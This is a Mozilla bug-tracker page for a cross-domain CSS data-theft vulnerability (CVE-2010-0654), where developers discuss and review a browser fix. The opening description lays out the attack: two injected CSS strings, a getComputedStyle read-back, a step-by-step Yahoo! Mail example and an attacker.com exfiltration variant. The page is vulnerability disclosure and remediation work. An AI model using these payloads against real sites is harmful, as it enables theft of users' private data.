[Component:](/describecomponents.cgi?product=Core&component=CSS%20Parsing%20and%20Computation#CSS%20Parsing%20and%20Computation)

CSS Parsing and Computation
▾

Core :: CSS Parsing and Computation

Issues with loading CSS style sheets from the network, parsing style sheets and style attributes in HTML markup, performing the CSS cascade, selector matching, and producing correct computed values for CSS properties.

Example bugs:

* toggling class name on an element does not restyle the element
* background-color property does not support hsl() values

Specifications covered:

* CSS Cascading
* CSS Conditional
* CSS Logical Properties
* CSS Namespaces
* CSS Scoping
* CSS Style Attributes
* CSS Syntax
* CSS Values
* CSS Variables
* Media Queries
* Selectors

[See Open Bugs in This Component](/buglist.cgi?product=Core&component=CSS%20Parsing%20and%20Computation&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=CSS%20Parsing%20and%20Computation&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=CSS%20Parsing%20and%20Computation)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

Trunk

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

All

All

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P1

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

---

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| a11y-review | --- |
| --- | --- |
| Webcompat Score | --- |
| Performance Impact | --- |
| Accessibility Severity | --- |
| Webcompat Priority | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| blocking2.0 | --- | [alpha1+](/buglist.cgi?f1=cf_blocking_20&o1=equals&v1=alpha1%2B) |
| blocking1.9.2 | --- | [needed](/buglist.cgi?f1=cf_blocking_192&o1=equals&v1=needed) |
| status1.9.2 | --- | [.5-fixed](/buglist.cgi?f1=cf_status_192&o1=equals&v1=.5-fixed) |
| blocking1.9.1 | --- | [needed](/buglist.cgi?f1=cf_blocking_191&o1=equals&v1=needed) |
| status1.9.1 | --- | [.11-fixed](/buglist.cgi?f1=cf_status_191&o1=equals&v1=.11-fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| blocking2.0 |  | alpha1+ |
| blocking1.9.2 |  |  |
| status1.9.2 |  | .5-fixed |
| blocking1.9.1 |  | needed |
| relnote-firefox |  | --- |
| status1.9.1 |  | .11-fixed |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: ladamski, Assigned: zwol)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/5c6e37465526f5741ae73554a7e9c1fb?d=mm&size=40)  [zwol](/user_profile?user_id=34122)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/fd0281367d4545f8c0fa1f8276a381d2?d=mm&size=40)  [ladamski](/user_profile?user_id=322148)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/1d91d22a4892f16f744b31fd4286144e?d=mm&size=40)  [emilio](/user_profile?user_id=546716)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

21 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[536603](/show_bug.cgi?id=536603 "RESOLVED INACTIVE - Intermittent layout/style/test/test_css_cross_domain.html | quirks IB1l - got rgb(255, 0, 0), expected rgb(0, 255, 0)"), [588794](/show_bug.cgi?id=588794 "RESOLVED FIXED - Conditional jump or move depends on uninitialised value(s) [@ CSSLoaderImpl::ParseSheet]")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

[536606](/show_bug.cgi?id=536606 "RESOLVED INCOMPLETE - Trunk now rejects cross-domain CSS loads with improper MIME type, even in quirks mode")

Dependency [tree](/showdependencytree.cgi?id=524223&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=524223)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (4 keywords, Whiteboard: [sg:moderate])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2010-0654

[Keywords:](/describekeywords.cgi)

[dev-doc-complete](/buglist.cgi?keywords=dev-doc-complete&resolution=---),
[relnote](/buglist.cgi?keywords=relnote&resolution=---),
[verified1.9.1](/buglist.cgi?keywords=verified1.9.1&resolution=---),
[verified1.9.2](/buglist.cgi?keywords=verified1.9.2&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[sg:moderate]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [roc](/user_profile?user_id=5038) | [blocking1.9.2](#c8 "15 years ago") | - |
| --- | --- | --- |
| [roc](/user_profile?user_id=5038) | blocking1.9.2 | - |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | [blocking1.9.0.19](#a10706383_1689 "15 years ago") | - |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | blocking1.9.0.19 | - |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | [wanted1.9.0.x](#a1197268_1689 "15 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | wanted1.9.0.x | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (5 files, 10 obsolete files)

| [partial patch (CSSLoader changes only)](/attachment.cgi?id=411763)  [15 years ago](#c10)  [Zack Weinberg (:zwol)](/user_profile?user_id=34122)   26.50 KB, patch | bzbarsky : [review-](#c11 "15 years ago") | [Details](/attachment.cgi?id=411763&action=edit) | [Diff](/attachment.cgi?id=411763&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=411763) |
| --- | --- | --- |
| [WebKit patch for reference](/attachment.cgi?id=411823)  [15 years ago](#c14)  [Chris Evans](/user_profile?user_id=322399)   21.64 KB, patch |  | [Details](/attachment.cgi?id=411823&action=edit) | [Diff](/attachment.cgi?id=411823&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=411823) |
| [complete patch](/attachment.cgi?id=412759)  [15 years ago](#c20)  [Zack Weinberg (:zwol)](/user_profile?user_id=34122)   49.89 KB, patch | dbaron : [superreview-](#c26 "15 years ago") | [Details](/attachment.cgi?id=412759&action=edit) | [Diff](/attachment.cgi?id=412759&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=412759) |
| [patch v2: quirks mode improper MIME type style loads must be same origin](/attachment.cgi?id=418733)  [15 years ago](#c31)  [Zack Weinberg (:zwol)](/user_profile?user_id=34122)   30.35 KB, patch | bzbarsky : [review+](#c36 "15 years ago")  dbaron : [superreview+](#c38 "15 years ago") | [Details](/attachment.cgi?id=418733&action=edit) | [Diff](/attachment.cgi?id=418733&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=418733) |
| [whitespace-ignoring diff of nsCSSLoader.cpp](/attachment.cgi?id=418737)  [15 years ago](#c33)  [Zack Weinberg (:zwol)](/user_profile?user_id=34122)   3.41 KB, patch |  | [Details](/attachment.cgi?id=418737&action=edit) | [Diff](/attachment.cgi?id=418737&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=418737) |
| [trunk patch as landed](/attachment.cgi?id=419021)  [15 years ago](#c46)  [Zack Weinberg (:zwol)](/user_profile?user_id=34122)   30.79 KB, patch |  | [Details](/attachment.cgi?id=419021&action=edit) | [Diff](/attachment.cgi?id=419021&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=419021) |
| [1.9.2 branch patch, with the "valid first initial construct" heuristic](/attachment.cgi?id=420591)  [15 years ago](#c52)  [Zack Weinberg (:zwol)](/user_profile?user_id=34122)   62.58 KB, patch |  | [Details](/attachment.cgi?id=420591&action=edit) | [Diff](/attachment.cgi?id=420591&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=420591) |
| [1.9.2 branch patch (with heuristic) v2: more tests, bugs fixed](/attachment.cgi?id=420842)  [15 years ago](#c54)  [Zack Weinberg (:zwol)](/user_profile?user_id=34122)   70.40 KB, patch |  | [Details](/attachment.cgi?id=420842&action=edit) | [Diff](/attachment.cgi?id=420842&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=420842) |
| [1.9.2 branch patch with new heuristic](/attachment.cgi?id=438197)  [15 years ago](#c65)  [Zack Weinberg (:zwol)](/user_profile?user_id=34122)   55.75 KB, patch | dbaron : [review-](#a14517432_3881 "15 years ago") | [Details](/attachment.cgi?id=438197&action=edit) | [Diff](/attachment.cgi?id=438197&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=438197) |
| [1.9.2 branch patch with dbaron's high-level changes made](/attachment.cgi?id=438558)  [15 years ago](#c71)  [Zack Weinberg (:zwol)](/user_profile?user_id=34122)   61.40 KB, patch | dbaron : [review+](#c74 "15 years ago")  christian : [approval1.9.2.5+](#c79 "15 years ago") | [Details](/attachment.cgi?id=438558&action=edit) | [Diff](/attachment.cgi?id=438558&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=438558) |
| [1.9.2 patch backported to 1.9.1](/attachment.cgi?id=439488)  [15 years ago](#c72)  [Mike Hommey [:glandium]](/user_profile?user_id=47192)   48.39 KB, patch | dbaron : [review-](#c75 "15 years ago") | [Details](/attachment.cgi?id=439488&action=edit) | [Diff](/attachment.cgi?id=439488&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=439488) |
| [1.9.2 branch patch as landed](/attachment.cgi?id=447101)  [15 years ago](#c80)  [Zack Weinberg (:zwol)](/user_profile?user_id=34122)   63.23 KB, patch |  | [Details](/attachment.cgi?id=447101&action=edit) | [Diff](/attachment.cgi?id=447101&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=447101) |
| [1.9.1 backport of as-landed 1.9.2 patch](/attachment.cgi?id=447120)  [15 years ago](#c81)  [Zack Weinberg (:zwol)](/user_profile?user_id=34122)   64.42 KB, patch | dbaron : [review+](#c82 "15 years ago")  beltzner : [approval1.9.1.11+](#c83 "15 years ago") | [Details](/attachment.cgi?id=447120&action=edit) | [Diff](/attachment.cgi?id=447120&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=447120) |
| [1.9.0 backport](/attachment.cgi?id=459893)  [15 years ago](#c91)  [Mike Hommey [:glandium]](/user_profile?user_id=47192)   55.09 KB, patch | dbaron : [review+](#c95 "15 years ago") | [Details](/attachment.cgi?id=459893&action=edit) | [Diff](/attachment.cgi?id=459893&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=459893) |
| [1.9.0 backport](/attachment.cgi?id=465966)  [14 years ago](#c98)  [Mike Hommey [:glandium]](/user_profile?user_id=47192)   55.02 KB, patch |  | [Details](/attachment.cgi?id=465966&action=edit) | [Diff](/attachment.cgi?id=465966&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=465966) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Lucas Adamski [:ladamski]](/user_profile?user_id=322148)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=524223#c0)• 15 years ago |
|  | |

From Chris Evans:
The attack involves cross-domain CSS stylesheet loading. Because the CSS
parser is very lax, it will skip over any amount of preceding and following
junk, in its quest to find a valid selector. Here is an example of a valid
selector:
body { background-image: url('<http://www.evil.com/blah>'); }
If a construct like this can be forced to appear anywhere in a cross-domain
document, then cross-domain theft may be possible. The attacker can introduce
this construct into a page by injecting two strings:
1) {}body{background-image:url('<http://google.com/>
(Note that the seemingly redundant {} is to resync
the CSS parser to make sure the evil descriptor parses properly. Further note
that having the url start like a valid url is required to steal the text in
some browsers).
2) ');}
Any anything between those two strings will then be cross-domain stealable! The
data is stolen cross domain with e.g.
window.getComputedStyle(body\_element,
null).getPropertyValue('background-image');
(This works in most browsers; for IE, you use ele.currentStyle.backgroundImage)
There are a surprising number of places in internet sites where an attacker
can do this. It can apply to HTML, XML, JSON, XHTML, etc.
At this point, an example is probably useful. To set up for this example, you
need:
a) Get a Yahoo! Mail account.
b) Make sure you are logged into it.
c) E-mail the target victim Yahoo! account with the subject
');}
d) Wait a bit, so that some sensitive e-mails fill the inbox. (Or just simulate
one).
e) E-mail the target victim Yahoo! account with the subject
{}body{background-image:url('<http://google.com/>
f) Send victim to theft page
<https://cevans-app.appspot.com/static/yahoocss.html>
g) The stolen text shown is achieved via cross-domain CSS theft.
Other good examples I've had success with are social networking sites, where
the attacker gets to leave arbitrary-text comments which are rendered on the
victim's trusted page.
The main common construct that prevents exploitation is newlines.
Obviously, newlines cannot be considered a defense! Escaping or encoding of
quote characters can also interfere with exploitation. One useful trick: if '
is escaped, use " to enclose the CSS string.
Part 2 (on possible solutions) to follow.
Possible solutions.
First, there are some solutions it is easy to reject:
1) Restrict read of CSS text if it came from a different domain.
This is a useful defense that I filed a while ago in a different bug. But it
will not help in this case. The attacker can simply use
<http://www.attacker.com/> as a prefix for the background-image value, and wait
for the HTTP GET to arrive which includes the stolen text in the payload.
2) Do not send cookies for cross-domain CSS loads.
This probably breaks a load of sites? It is certainly a riskier approach. I
have not dared try it!
The solution that I'm playing with is as follows:
- Activate "strict MIME type required" in the event that the CSS was loaded
(via link tag or @import) as a cross-domain resource.
- Also, crash hard if a CSS load fails due to strict MIME type test failure.
I've been running my build locally with these changes for a few days and there
seems to be some merit in this approach, i.e. my browser hasn't crashed apart
from when I hit my attack URLs.
I see that WebKit has a history of defaulting to "strict MIME type required"
for \_all\_ CSS loads, and that historically broke some sites like dell.com and
was reverted.
Perhaps the web at large now has its MIME types in order well enough to at
least enforce strict for cross-domain CSS loads? If too much breaks, we have
the additional level we can introduce of trying to parse the cross-domain CSS
but bailing on first syntax error. I'd like to avoid a test that is going that
deep into nuance, however.

|  | [Lucas Adamski [:ladamski]](/user_profile?user_id=322148)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=524223#c1)• 15 years ago |
|  | |

Marking sg:moderate as it could lead to theft of confidential information but is mitigated by the need to inject attacker controlled content into page being viewed on victim site.Whiteboard: [sg:moderate]

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=524223#c2)• 15 years ago |
|  | |

(In reply to [comment #0](/show_bug.cgi?id=524223#c0 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> Perhaps the web at large now has its MIME types in order well enough to at
> least enforce strict for cross-domain CSS loads?
This seems like something that we could try. Probably we'd
want to use the eTLD service, but we could avoid doing that until
we've already found that we loaded a stylesheet and it's not
text/css .
I suspect the big question would be whether sites like akamai send
the correct MIME type reliably.
The other question is whether we'd have a problem with the things
that we now accept in standards mode: empty content-type and
UNKNOWN\_CONTENT\_TYPE, and whether we'd need to change our handling
of those in order to prevent this attack. (Probably not in most
cases, but there could be some; then again, one could easily argue
it's a bug in the site if it's putting content it wants interpreted
in a specific way in a response with no Content-Type specified.)
The relevant code is in SheetLoadData::OnStreamComplete in
nsCSSLoader.cpp, though we probably also have to worry about the
hint type set in CSSLoaderImpl::LoadSheet. Boris might know more.Component: Security → Style System (CSS)QA Contact: toolkit → style-system

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a1717_3881)• 15 years ago |

OS: Mac OS X → AllHardware: x86 → All

|  | [Chris Evans](/user_profile?user_id=322399) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=524223#c3)• 15 years ago |
|  | |

An update. I've crunched some data on 500,000 URLs and will have a recommendation on how to close the hole without breaking compatibility shortly :)
Regarding [comment #2](/show_bug.cgi?id=524223#c2 "RESOLVED FIXED - Cross-domain data theft using CSS") - I'd see it as a bug in a site if it had a missing content-type, or a poorly specified content type.

|  | [Chris Evans](/user_profile?user_id=322399) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=524223#c4)• 15 years ago |
|  | |

I fixed this properly in WebKit (pending review).
I mined 500,000 URLs to see what sort of cross-domain CSS load + MIME braindamage exists. There's a little bit, e.g. configure.dell.com loading text/plain CSS. A bunch of sites do this. A bunch of other sites load application/octet-stream CSS and even a fair bit of text/html CSS.
Therefore, the solution devised was:
- Reject a CSS load if all of these are met:
a) It is cross-domain load (making sure a redirect does not confuse the domain check)!
b) Not a valid MIME type (text/css, application/x-unknown-content-type or empty).
c) The alleged CSS does not start with a syntactically valid CSS construct.
The above rules will block the attack because an HTML, XML etc. header will always cause a broken first CSS descriptor.
And the above rules are compatible. Out of the 500,000 URLs, just one very broken site has its look changed a little by this change: <http://practiceexam.keys2drive.ca/quiz.php> which does cross-domain CSS load for a text/html resource which has a CSS resource after a <style> tag. That is highly broken.
Regarding disclosure, there is no particular co-ordination. Fix and disclose when you are ready. Please credit "Chris Evans, Google Security Team".
This issue will be disclosed no later that 16th April 2009, and quite probably a lot sooner.

|  | [Reed Loden [:reed]](/user_profile?user_id=159758) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=524223#c5)• 15 years ago |
|  | |

(In reply to [comment #4](/show_bug.cgi?id=524223#c4 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> This issue will be disclosed no later that 16th April 2009, and quite probably
> a lot sooner.
16th April 2010, I hope you mean?

|  | [Reed Loden [:reed]](/user_profile?user_id=159758) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a1132096_159758)• 15 years ago |

blocking1.9.1: --- → ?
[status1.9.1](/buglist.cgi?f1=cf_status_191&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_status_191&o1=equals&v1=%3F)Flags: wanted1.9.0.x?Flags: blocking1.9.2?

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=524223#c6)• 15 years ago |
|  | |

(In reply to [comment #0](/show_bug.cgi?id=524223#c0 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> At this point, an example is probably useful. To set up for this example, you
> need:
> a) Get a Yahoo! Mail account.
> b) Make sure you are logged into it.
> c) E-mail the target victim Yahoo! account with the subject
> ');}
> d) Wait a bit, so that some sensitive e-mails fill the inbox. (Or just simulate
> one).
> e) E-mail the target victim Yahoo! account with the subject
> {}body{background-image:url('<http://google.com/>
> f) Send victim to theft page
> <https://cevans-app.appspot.com/static/yahoocss.html>
> g) The stolen text shown is achieved via cross-domain CSS theft.
I think, in a conformant CSS implementation, this will only work if there are no newlines or single quotes between the content from (e) and the content from (c), so the attack is rather constrained (though still, I think, worth fixing).

|  | [Chris Evans](/user_profile?user_id=322399) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=524223#c7)• 15 years ago |
|  | |

@5: Yes, 16th April 2010 as an upper bound. I wouldn't be surprised if WebKit-based browsers update sooner, though, since the WebKit patch should land tonight. I also worry that people monitor WebKit commits for additions to the LayoutTests/http/tests/security directory.
@6: Correct about newlines. Single quotes do not pose a problem for the attacker, as there is the option to enclose the CSS string within double quotes. A single quote within a double quote (and visa versa) is fine.
Also, I've found that "no newlines" is quite common in data access APIs that spit out authenticated data as JSON or XML.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a1197268_1689)• 15 years ago |

blocking1.9.1: ? → needed
[status1.9.1](/buglist.cgi?f1=cf_status_191&o1=isnotempty):
[?](/buglist.cgi?f1=cf_status_191&o1=equals&v1=%3F) → [wanted](/buglist.cgi?f1=cf_status_191&o1=equals&v1=wanted)Flags: wanted1.9.0.x? → wanted1.9.0.x+Whiteboard: [sg:moderate] → [sg:moderate] disclosure upper bound April 2010, but webkit fix checked in

|  | [Robert O'Callahan (:roc) (email my personal email if necessary)](/user_profile?user_id=5038) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=524223#c8)• 15 years ago |
|  | |

Not blocking 1.9.2, but we should definitely come up with a fix ASAP and backport that fix to some 1.9.2 update.
The plan in [comment #4](/show_bug.cgi?id=524223#c4 "RESOLVED FIXED - Cross-domain data theft using CSS") looks good to me.
Zack, can you take this?Flags: blocking1.9.2? → blocking1.9.2-

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=524223#c9)• 15 years ago |
|  | |

Sure, I'm already messing with the CSSLoader, this shouldn't be too hard. @cevans: would you be willing to let us have the tests you wrote for webkit, & if so, could you attach them to this bug?

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=524223#c10)• 15 years ago |
|  | |

Attached patch

[partial patch (CSSLoader changes only)](attachment.cgi?id=411763&action=diff) (obsolete)
— [Details](attachment.cgi?id=411763&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=411763)

This is an incomplete patch. It compiles, and it contains the code necessary to detect the conditions laid out in [comment #4](/show_bug.cgi?id=524223#c4 "RESOLVED FIXED - Cross-domain data theft using CSS") and notify the parser, but I haven't actually made the parser do anything with this yet. That's going to be rather longer and less interesting, alas.
I'm asking for review on this because I'm not sure I did the cross-domain check correctly nor in all the places where it needs to happen.
Tangentially, this patch (as with anything that touches nsICSSParser) is going to conflict with my changes in [bug 523496](/show_bug.cgi?id=523496 "RESOLVED FIXED - DeCOM ns(I)CSSParser"). I'd kinda like to land that first.Assignee: nobody → zweinbergStatus: NEW → ASSIGNED
[Attachment #411763](/attachment.cgi?id=411763&action=edit "partial patch (CSSLoader changes only)") -
Flags: review?(bzbarsky)

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=524223#c11)• 15 years ago |
|  | |

Comment on [attachment 411763](/attachment.cgi?id=411763 "partial patch (CSSLoader changes only)") [[details]](/attachment.cgi?id=411763&action=edit "partial patch (CSSLoader changes only)") [[diff]](/attachment.cgi?id=411763&action=diff "partial patch (CSSLoader changes only)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=411763)
partial patch (CSSLoader changes only)
This doesn't actually work right, since you're doing the same-origin check before you start the load. In particular, the attacker could link to his own server (same-origin for purposes of this check) and then issue an HTTP 3xx response to redirect to the server being attacked. The code here wouldn't detect that.
A better way to handle this, probably is to compare mLoaderPrincipal (which is the principal of the entity that started the load) to |principal| (which is the principal of the stylesheet, now that we've got its data and know exactly where that came from) in SheetLoadData::OnStreamComplete. Presumably a Subsumes() check. Note that mLoaderPrincipal may be null, in which case the load wasn't triggered on behalf of any web page and should be allowed.
[Attachment #411763](/attachment.cgi?id=411763&action=edit "partial patch (CSSLoader changes only)") -
Flags: review?(bzbarsky) → review-

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=524223#c12)• 15 years ago |
|  | |

Oh, and if you want to land this on branches you need a version that doesn't go on top of [bug 523496](/show_bug.cgi?id=523496 "RESOLVED FIXED - DeCOM ns(I)CSSParser") anyway, right?

|  | [Chris Evans](/user_profile?user_id=322399) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=524223#c13)• 15 years ago |
|  | |

As requested, I'll upload the WebKit patch (including test) that is currently in-review.

|  | [Chris Evans](/user_profile?user_id=322399) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=524223#c14)• 15 years ago |
|  | |

Attached patch

[WebKit patch for reference](attachment.cgi?id=411823&action=diff)
— [Details](attachment.cgi?id=411823&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=411823)

|  | [Chris Evans](/user_profile?user_id=322399) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=524223#c15)• 15 years ago |
|  | |

An update on disclosure: Since this is a tricky issue, there will be guaranteed no disclosure prior to Dec 28th 2009.
If you want to fix this sooner than then -- please do, and push your fix out to users. Just refrain from mentioning this in the release notes or security notes. Non-prominent disclosure via source repository comments is fine.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a1875865_1689)• 15 years ago |

Whiteboard: [sg:moderate] disclosure upper bound April 2010, but webkit fix checked in → [sg:moderate] embargoed until at least 2009-12-28, possibly as long as Apr-2010. webkit fix checked in

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=524223#c16)• 15 years ago |
|  | |

(In reply to [comment #11](/show_bug.cgi?id=524223#c11 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> (From update of [attachment 411763](/attachment.cgi?id=411763 "partial patch (CSSLoader changes only)") [[details]](/attachment.cgi?id=411763&action=edit "partial patch (CSSLoader changes only)") [[diff]](/attachment.cgi?id=411763&action=diff "partial patch (CSSLoader changes only)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=411763))
> This doesn't actually work right, since you're doing the same-origin check
> before you start the load. In particular, the attacker could link to his own
> server (same-origin for purposes of this check) and then issue an HTTP 3xx
> response to redirect to the server being attacked. The code here wouldn't
> detect that.
I was afraid there might be a problem like that. Thanks.
> A better way to handle this, probably is to compare mLoaderPrincipal (which is
> the principal of the entity that started the load) to |principal| (which is the
> principal of the stylesheet, now that we've got its data and know exactly where
> that came from) in SheetLoadData::OnStreamComplete. Presumably a Subsumes()
> check. Note that mLoaderPrincipal may be null, in which case the load wasn't
> triggered on behalf of any web page and should be allowed.
Ok. That should be less invasive, too, which is nice.
I see that in some circumstances mLoaderPrincipal may be a null \*pointer\*, but do I have to worry about null \*principals\* in here as well?
(In reply to [comment #12](/show_bug.cgi?id=524223#c12 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> Oh, and if you want to land this on branches you need a version that doesn't go
> on top of [bug 523496](/show_bug.cgi?id=523496 "RESOLVED FIXED - DeCOM ns(I)CSSParser") anyway, right?
Bleah, good point. I'll keep developing it in isolation then.

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=524223#c17)• 15 years ago |
|  | |

(In reply to [comment #16](/show_bug.cgi?id=524223#c16 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> I see that in some circumstances mLoaderPrincipal may be a null \*pointer\*, but
> do I have to worry about null \*principals\* in here as well?
|principal| is guaranteed non-null here, after the early-return branch that logs "couldn't get principal" has not been taken. I assume that's what you were asking about?
If you were asking about nsNullPrincipal, then you don't need to worry about it. mLoaderPrincipal (and |principal|, for that matter) may be nsNullPrincipal and that's ok. The security checks will do the right thing with that.

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=524223#c18)• 15 years ago |
|  | |

(In reply to [comment #17](/show_bug.cgi?id=524223#c17 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> If you were asking about nsNullPrincipal, then you don't need to worry about
> it. mLoaderPrincipal (and |principal|, for that matter) may be nsNullPrincipal
> and that's ok. The security checks will do the right thing with that.
Yes, I was asking about nsNullPrincipal. Thanks for clarifying.
My other big concern at this stage is here:
@@ CSSLoaderImpl::LoadSheet
- rv = ParseSheet(converterStream, aLoadData, completed);
+ // XXX Can we ever have a cross-domain, improper-MIME, synchronous load?
+ rv = ParseSheet(converterStream, aLoadData, completed, PR\_FALSE);
